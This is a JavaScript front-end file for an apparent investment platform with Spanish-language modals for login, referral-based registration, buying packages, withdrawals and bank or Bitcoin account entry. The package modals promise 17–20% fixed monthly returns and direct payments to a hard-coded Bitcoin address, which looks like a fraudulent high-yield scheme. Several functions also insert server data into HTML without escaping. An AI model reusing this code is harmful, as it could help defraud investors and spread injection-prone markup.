

function login() {
   
   var parametros = {
            "login" : true,
            "user_login"  : $("#user_login").val(),
            "pass_login"  : $("#pass_login").val()
    };
    $.ajax({
                data:  parametros,
                url:   'controller.php',
                type:  'post',
                beforeSend: function () {
                        $("#homeContent").html("Procesando, espere por favor...");
                },
                success:  function (response) {
                    var result = JSON.parse(response);
                    if ( result.respuesta ) {
                        self.location.reload();
                    } else {
                        swal("Acceso denegado.");
                    }
                }
        });
   
}


function cargarHtml(cargar){
    
    var parametros = {
            "html" : cargar
    };
    $.ajax({
                data:  parametros,
                url:   'controller.php',
                type:  'post',
                beforeSend: function () {
                        $("#homeContent").html("Procesando, espere por favor...");
                },
                success:  function (response) {
                        $("#homeContent").html(response);
                        if(cargar == "referidos") {
                            $('[data-toggle="tooltip"]').tooltip();
                        }
                }
        });
    
}

function logout(cargar){
    
    var parametros = {
            "logout" : true
    };
    $.ajax({
                data:  parametros,
                url:   'controller.php',
                type:  'post',
                beforeSend: function () {
                        $("#homeContent").html("Procesando, espere por favor...");
                },
                success:  function (response) {
                        self.location.reload();
                }
        });
    
}

function sweetal(val){
    swal(val);
}

function registro(){
    
    $("#modal-title").html("Registrar Nuevo Cliente");
    $("#modal-body").html("<label for='nombre'>Nombre: </label><input type='text' class='form-control' placeholder='Nombre' name='nombre' id='nombre' required>"+
                          "<label for='correo'>Correo: </label><input type='text' class='form-control' placeholder='Correo' name='mail' id='nombre' required>"+
                          "<label for='usuario'>Usuario: </label><input type='text' class='form-control' placeholder='Usuario' name='usuario' id='usuario' required>"+
                          "<label for='clave1'>Contrase&nacute;a: </label><input type='password' class='form-control' placeholder='Contrase&ntilde;a' name='clave1' id='clave1' required>"+
                          "<label for='clave2'>Confirmar Contrase&nacute;a: </label><input type='password' class='form-control' placeholder='Confirmar Contrase&ntilde;a' name='clave2' id='clave2' required>"+
                          "<label for='foto'>Foto: </label><input name='foto' id='foto' type='file' class='form-control form-file' accept='image/x-png,image/gif,image/jpeg' />"+
                          "<label for='referido'>Referido: </label><input type='text' class='form-control' placeholder='Referido Por' name='referido' id='referido' required>"+
                          "<input type='hidden' name='registro' id='hidden' value = 'true'><iframe name='iframeUpload' style='display:none'></iframe>"
                          
                         );
    $("#modal-footer").html('<input type="submit" class="btn btn-info" style="font-size: 10px;" value="Registrarme"><button type="button" class="btn btn-default" data-dismiss="modal" style="font-size: 10px;">Cancelar</button>');           
    $("#modalBuy").modal();
    
    
}


function miperfil(){
    
    var parametros = {
            "miperfil" : true
        };
        $.ajax({
                    data:  parametros,
                    url:   'controller.php',
                    type:  'post',
                    /*beforeSend: function () {
                            $("#homeContent").html("Procesando, espere por favor...");
                    },*/
                    success:  function (response) {
                            var result = JSON.parse(response);
                            
                        
                            if ( result.respuesta ) {
                                
                                $("#modal-title").html("Editar Mi Perfil");
                                $('#form_modal').attr('onsubmit', 'editarPerfil(); return false;');
                                $("#modal-body").html("<label for='nombre'>Nombre: </label><input type='text' value='"+result.datos.nombre+"' class='form-control' placeholder='Nombre' name='nombre' id='nombre' required>"+
                                                      "<label for='correo'>Correo: </label><input type='text' value='"+result.datos.correo+"' class='form-control' placeholder='Correo' name='mail' id='nombre' required>"+
                                                      "<label for='usuario'>Usuario: </label><input type='text' readonly value='"+result.datos.login+"' class='form-control' placeholder='Usuario' name='usuario' id='usuario' required>"+
                                                      "<label for='referido'>Referido: </label><input type='text' readonly value='"+result.datos.referido+"' class='form-control' placeholder='Referido Por' name='referido' id='referido' required>"

                                                     );
                                $("#modal-footer").html('<input type="submit" class="btn btn-info" style="font-size: 10px;" value="Guardar"><button type="button" class="btn btn-default" data-dismiss="modal" style="font-size: 10px;">Cancelar</button>');           
                                $("#modalClient").modal();
                                
                            } else {
                                swal(result.msg);
                            }
                    }
        });
    
    
}

function closeModal(){
    $("#modalBuy").modal('hide');
}

function aceptarRegistro(){
    
    if ( $("#clave1").val() != $("#clave2").val() ) {
        swal("Las contraseñas ingresadas no coinciden");
    } else {
        $("#form_registro").submit();
        /*
        var parametros = {
            "registro" : true,
            "datosForm" : $("#form_registro").serialize()
        };
        $.ajax({
                    data:  parametros,
                    url:   'controller.php',
                    type:  'post',
                    beforeSend: function () {
                            //$("#homeContent").html("Procesando, espere por favor...");
                    },
                    success:  function (response) {
                            var result = JSON.parse(response);
                            if ( result.respuesta ) {
                                $("#modalBuy").modal('hide');
                                swal(result.msg);
                                
                            } else {
                                swal(result.msg);
                            }
                    }
        }); */
    }
    
    
    
}

function editarPerfil(){
    
    var parametros = {
        "editarPerfil" : true,
        "datosForm" : $("#form_modal").serialize()
    };
    $.ajax({
                data:  parametros,
                url:   'controller.php',
                type:  'post',
                
                success:  function (response) {
                        var result = JSON.parse(response);
                        if ( result.respuesta ) {
                            $("#modalClient").modal('hide');
                            swal(result.msg);

                        } else {
                            swal(result.msg);
                        }
                }
    });
}


function modalInfo(id){
    
    
   $("#modal-footer").html('<button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>');
   switch (id) {
        case 1:
                $("#modal-title").html("Paquete Principiante");
                $("#modal-body").html("<h3><img src='img/modulos/principiante.jpg' height='100px'>&nbsp;&nbsp;&nbsp;<b> Inversion de $US 100,oo </b><br><h4><b>Rentabilidad mensual de 17%</b></h4></h3>");
                break;
        case 2:
                $("#modal-title").html("Paquete Inversionista");
                $("#modal-body").html("<h3><img src='img/modulos/aprendiz.jpg' height='100px'>&nbsp;&nbsp;&nbsp;<b> Inversion de $US 1.000,oo </b><br><h4><b>Rentabilidad mensual de 18%</b></h4></h3>");
                break;
        case 3:
                $("#modal-title").html("Paquete Trader");
                $("#modal-body").html("<h3><img src='img/modulos/trader.jpg' height='100px'>&nbsp;&nbsp;&nbsp;<b> Inversion de $US 2.000,oo </b><br><h4><b>Rentabilidad mensual de 19%</b></h4></h3>");
                break;
        case 4:
                $("#modal-title").html("Paquete Master");
                $("#modal-body").html("<h3><img src='img/modulos/master-vip.jpg' height='100px'>&nbsp;&nbsp;&nbsp;<b> Inversion de $US 5.000,oo </b><br><h4><b>Rentabilidad mensual de 20%</b></h4></h3>");
                break;
        default:
            console.log("Sorry, we are out of " + id + ".");
}
   $("#modalBuy").modal();
}


function comprarPaquete(id){
    
    
   $("#modal-footer").html('<button type="button" class="btn btn-info" onclick="aceptarCompra('+id+')">Confirmar Pago</button><button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>');
   switch (id) {
        case 1:
                $("#modal-title").html("<img src='img/modulos/principiante.jpg' height='80px'>Paquete Principiante");
                $("#modal-body").html('<ul class="nav nav-tabs"><li class="active"><a data-toggle="tab" href="#home">' +
                                      '<i class="fa fa-bitcoin"></i> Bitcoin</a></li><li><a data-toggle="tab" href="#menu1"><img src="img/modulos/logo-bancolombia-Copiar.jpg" height="15px">Bancolombia</a></li>'+
                                      '</ul>'+
                                      '<div class="tab-content"><div id="home" class="tab-pane fade in active"><p>Para comprar el paquete <b>Principiante</b> envia la cantidad de <b>100 USD</b> '+
                                      'a la siguiente direccion de Bitcoin &oacute; escanea el codigo QR desde un movil: <br><div style="text-align:center;"> '+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>18YRQ5po6Jbttjb7jGD6HjTA26krhjHXHG</b></div> <br>'+
                                      'Despues de efectuar el pago ingrese su direccion bitcoin de pago y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBitCoin" id="transaccionBitCoin"></div></p></div>'+
                                      
                                      '<div id="menu1" class="tab-pane fade"><p>Para comprar el paquete <b>Principiante</b> consigna la cantidad de <b>100 USD</b> '+
                                      'a la siguiente cuenta de ahorros de Bancolombia: <br><div style="text-align:center;"></p>'+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>Ahorros xxxx-xxxxxxx</b></div> <br>'+
                                      'Despues de realizar la consignacion ingrese el codigo de la transferencia y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBanco" id="transaccionBanco"></div></p></div>'+
                                      '</div>    </div></div>');
                break;
        case 2:
                $("#modal-title").html("<img src='img/modulos/aprendiz.jpg' height='80px'>Paquete Aprendiz");
                $("#modal-body").html('<ul class="nav nav-tabs"><li class="active"><a data-toggle="tab" href="#home">' +
                                      '<i class="fa fa-bitcoin"></i> Bitcoin</a></li><li><a data-toggle="tab" href="#menu1"><img src="img/modulos/logo-bancolombia-Copiar.jpg" height="15px">Bancolombia</a></li>'+
                                      '</ul>'+
                                      '<div class="tab-content"><div id="home" class="tab-pane fade in active"><p>Para comprar el paquete <b>Principiante</b> envia la cantidad de <b>1000 USD</b> '+
                                      'a la siguiente direccion de Bitcoin &oacute; escanea el codigo QR desde un movil: <br><div style="text-align:center;"> '+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>18YRQ5po6Jbttjb7jGD6HjTA26krhjHXHG</b></div> <br>'+
                                      'Despues de efectuar el pago ingrese su direccion bitcoin de pago y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBitCoin" id="transaccionBitCoin"></div></p></div>'+
                                      
                                      '<div id="menu1" class="tab-pane fade"><p>Para comprar el paquete <b>Principiante</b> consigna la cantidad de <b>1000 USD</b> '+
                                      'a la siguiente cuenta de ahorros de Bancolombia: <br><div style="text-align:center;"></p>'+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>Ahorros xxxx-xxxxxxx</b></div> <br>'+
                                      'Despues de realizar la consignacion ingrese el codigo de la transferencia y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBanco" id="transaccionBanco"></div></p></div>'+
                                      '</div>    </div></div>');
                break;
        case 3:
                $("#modal-title").html("<img src='img/modulos/trader.jpg' height='80px'>Paquete Trader");
                $("#modal-body").html('<ul class="nav nav-tabs"><li class="active"><a data-toggle="tab" href="#home">' +
                                      '<i class="fa fa-bitcoin"></i> Bitcoin</a></li><li><a data-toggle="tab" href="#menu1"><img src="img/modulos/logo-bancolombia-Copiar.jpg" height="15px">Bancolombia</a></li>'+
                                      '</ul>'+
                                      '<div class="tab-content"><div id="home" class="tab-pane fade in active"><p>Para comprar el paquete <b>Principiante</b> envia la cantidad de <b>2000 USD</b> '+
                                      'a la siguiente direccion de Bitcoin &oacute; escanea el codigo QR desde un movil: <br><div style="text-align:center;"> '+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>18YRQ5po6Jbttjb7jGD6HjTA26krhjHXHG</b></div> <br>'+
                                      'Despues de efectuar el pago ingrese su direccion bitcoin de pago y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBitCoin" id="transaccionBitCoin"></div></p></div>'+
                                      
                                      '<div id="menu1" class="tab-pane fade"><p>Para comprar el paquete <b>Principiante</b> consigna la cantidad de <b>2000 USD</b> '+
                                      'a la siguiente cuenta de ahorros de Bancolombia: <br><div style="text-align:center;"></p>'+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>Ahorros xxxx-xxxxxxx</b></div> <br>'+
                                      'Despues de realizar la consignacion ingrese el codigo de la transferencia y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBanco" id="transaccionBanco"></div></p></div>'+
                                      '</div>    </div></div>');
                break;
        case 4:
                $("#modal-title").html("<img src='img/modulos/master-vip.jpg' height='80px'>Paquete Master - VIP");
                $("#modal-body").html('<ul class="nav nav-tabs"><li class="active"><a data-toggle="tab" href="#home">' +
                                      '<i class="fa fa-bitcoin"></i> Bitcoin</a></li><li><a data-toggle="tab" href="#menu1"><img src="img/modulos/logo-bancolombia-Copiar.jpg" height="15px">Bancolombia</a></li>'+
                                      '</ul>'+
                                      '<div class="tab-content"><div id="home" class="tab-pane fade in active"><p>Para comprar el paquete <b>Principiante</b> envia la cantidad de <b>5000 USD</b> '+
                                      'a la siguiente direccion de Bitcoin &oacute; escanea el codigo QR desde un movil: <br><div style="text-align:center;"> '+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>18YRQ5po6Jbttjb7jGD6HjTA26krhjHXHG</b></div> <br>'+
                                      'Despues de efectuar el pago ingrese su direccion bitcoin de pago y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBitCoin" id="transaccionBitCoin"></div></p></div>'+
                                      
                                      '<div id="menu1" class="tab-pane fade"><p>Para comprar el paquete <b>Principiante</b> consigna la cantidad de <b>5000 USD</b> '+
                                      'a la siguiente cuenta de ahorros de Bancolombia: <br><div style="text-align:center;"></p>'+
                                      '<img src="img/modulos/qr.png" width="150px;"><br><b>Ahorros xxxx-xxxxxxx</b></div> <br>'+
                                      'Despues de realizar la consignacion ingrese el codigo de la transferencia y haz click en confirmar pago.   <div style="text-align:center;">'+
                                      '<input class="form-control round-input" size="20" type="text" name="transaccionBanco" id="transaccionBanco"></div></p></div>'+
                                      '</div>    </div></div>');
                break;
        default:
            console.log("Sorry, we are out of " + id + ".");
}
   $("#modalBuy").modal();
}



function aceptarCompra(id){
    
    
    if ($('#transaccionBitCoin').val().trim() !== '' || $('#transaccionBanco').val().trim() !== '' ) {
        var parametros = {
                "aceptarCompra" : true,
                "paquete" : id,
                "transBit" : $("#transaccionBitCoin").val(),
                "transBan" : $("#transaccionBanco").val()
            };
            $.ajax({
                        data:  parametros,
                        url:   'controller.php',
                        type:  'post',
                        success:  function (response) {
                                var result = JSON.parse(response);
                                if ( result.respuesta ) {
                                    $("#modalBuy").modal('hide');
                                    swal(result.msg);

                                } else {
                                    swal(result.msg);
                                }
                        }
            });
        } else {
            swal("Por favor digite el comprobante de su transaccion.");
        }
    
}

function solicitarRetiro(){
    
    var formaPago = $("#metodoPagoRetiro").val();
    
    if ( formaPago !== "" && formaPago !== undefined ) {
    swal({
        title: "Confirmar Solicitud!",
        text: "Confirma que desea solicitar el retiro de tus ganancias?",
        buttons: true,
        dangerMode: false,
      })
      .then((willDelete) => {
        if (willDelete) {
          confirmarRetiro(formaPago);
        }
      });
    } else {
        swal("Por favor seleccione el metodo de pago.");
    }
    
}

function confirmarRetiro(formaPago){
    
    var parametros = {
        "solicitarRetiro" : true,
        "formaPago" : formaPago
    };
    $.ajax({
                data:  parametros,
                url:   'controller.php',
                type:  'post',
                
                success:  function (response) {
                        var result = JSON.parse(response);
                        if ( result.respuesta ) {
                            $("#modalClient").modal('hide');
                            swal(result.msg);

                        } else {
                            swal(result.msg);
                        }
                }
    });
    
}



function formularioCuentasBancarias(id){
    
    var titulo = "Registro Cuenta Transaccional";
    var bitcoin = "";
    var banco = "";
    var titularcuenta = "";
    var numerocuenta = "";
    
    if ( id != "" && id != undefined ) {
        
        titulo = "Modificar mi Cuenta Transaccional";
        bitcoin = datosCuenta.bitcoin;
        titularcuenta = datosCuenta.titular;
        numerocuenta = datosCuenta.cuenta;
    }
    
    $("#modal-title").html(titulo);
    //$('#form_modal').attr('onsubmit', 'editarPerfil(); return false;');
    $("#modal-body").html('<ul class="nav nav-tabs"><li class="active"><a data-toggle="tab" href="#home">' +
                                      '<i class="fa fa-bitcoin"></i> Cuenta Bitcoin</a></li><li><a data-toggle="tab" href="#menu1"><i class="fa fa-university"></i> Cuenta Bancaria</a></li>'+
                                      '</ul>'+
                                      '<div class="tab-content"><div id="home" class="tab-pane fade in active"><p> '+
                                      '<br>'+
                                      'Digite el ID o direccion de Bitcoin, si desea que sus ganancias se reflejen por medio de esta forma de pago.'+
                                      "<br><br><label for='direccionBitcoin'>Direccion Bitcoin: </label><input type='text' value='"+bitcoin+"' class='form-control' placeholder='Direccion Bitcoin' name='direccionBitcoin' id='direccionBitcoin'>"+
                                      '</p></div>'+
                                      
                                      '<div id="menu1" class="tab-pane fade">'+
                                      '<br>'+
                                      'Digite la informaci&oacute;n de su cuenta Bancaria'+
                                      "<br><br><label for='banco'>Banco: <select class='form-control' id = 'nombreBanco' name = 'nombreBanco'>" +
                                        '<option value="">--</option><option value="BANCO AV VILLAS">BANCO AV VILLAS</option><option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option><option value="BANCO COLPATRIA">BANCO COLPATRIA</option><option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option><option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option><option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option><option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option><option value="BANCO POPULAR">BANCO POPULAR</option><option value="BANCOLOMBIA">BANCOLOMBIA</option><option value="CITIBANK ">CITIBANK </option><option value="BANCO CORPBANCA - HELM BANK S.A.">BANCO CORPBANCA - HELM BANK S.A.</option> </select>  ' +
                                        "</label>"+
                                        "<label for='tipocuenta'>Tipo de Cuenta: <select class='form-control' id = 'tipoCuenta' name = 'tipoCuenta'>" +
                                        '<option value="">--</option><option value="AHORROS">AHORROS</option><option value="CORRIENTE">CORRIENTE</option> </select>  ' +
                                        "</label>"+
                                      "<label for='nocuenta'>N&uacute;mero de Cuenta: </label><input type='text' value='"+numerocuenta+"' class='form-control' placeholder='Numero Cuenta' name='nocuenta' id='nocuenta'>"+
                                      "<label for='anombre'>Nombre Titular: </label><input type='text' value='"+titularcuenta+"' class='form-control' placeholder='Nombre Titular' name='anombre' id='anombre'>"+
                                      '</div>'+
                                      '</div>    </div></div>' 
                          
                         );
    $("#modal-footer").html('<input type="button" class="btn btn-info" style="font-size: 10px;" value="Guardar" onclick="validarCuentasBancarias('+id+')"><button type="button" class="btn btn-default" data-dismiss="modal" style="font-size: 10px;">Cancelar</button>');           
    
    if ( id != "" && id != undefined ) {
        $("#nombreBanco").val(datosCuenta.banco).attr('selected', 'selected');
        $("#tipoCuenta").val(datosCuenta.tipo).attr('selected', 'selected');
    }
    
    $("#modalCuenta").modal();
    
}

function validarCuentasBancarias(id){
    
    var cuentaBitcoin = $("#direccionBitcoin").val().trim();
    var banco = $("#nombreBanco").val().trim();
    var tipoCuenta = $("#tipoCuenta").val().trim();
    var numeroCuenta = $("#nocuenta").val().trim();
    var aNombre = $("#anombre").val().trim();
    
    if ( cuentaBitcoin === '' && banco === '' && tipoCuenta === '' && numeroCuenta === '' && aNombre === '' ){
        swal("Por favor registre su cuenta transaccional antes de continuar.");
    } else {
        if ( banco !== '' || tipoCuenta !== '' || numeroCuenta !== '' || aNombre !== '' ){
            
            if ( banco === '' ){
                swal("Para registrar la cuenta bancaria, debera seleccionar el banco.");
                return;
            }
            if ( tipoCuenta === '' ){
                swal("Para registrar la cuenta bancaria, debera seleccionar el tipo de cuenta.");
                return;
            }
            if ( numeroCuenta === '' ){
                swal("Para registrar la cuenta bancaria, debera ingresar el numero de cuenta.");
                return;
            }
            if ( aNombre === '' ){
                swal("Para registrar la cuenta bancaria, debera ingresar el nombre del titular de la cuenta.");
                return;
            }
        }
        
        var parametros = {
            "guardarCuentaBancaria" : true,
            "cuentaBitcoin" : cuentaBitcoin,
            "banco" : banco,
            "tipoCuenta" : tipoCuenta,
            "numeroCuenta" : numeroCuenta,
            "aNombre" : aNombre,
            "idCuenta" : id
        };
        $.ajax({
                    data:  parametros,
                    url:   'controller.php',
                    type:  'post',

                    success:  function (response) {
                            var result = JSON.parse(response);
                            if ( result.respuesta ) {
                                $("#modalCuenta").modal('hide');
                                setTimeout ("cargarHtml('cuentabancaria')", 300); 
                                //swal(result.msg);

                            } else {
                                swal(result.msg);
                            }
                    }
        });
            
        
    
    }
        
}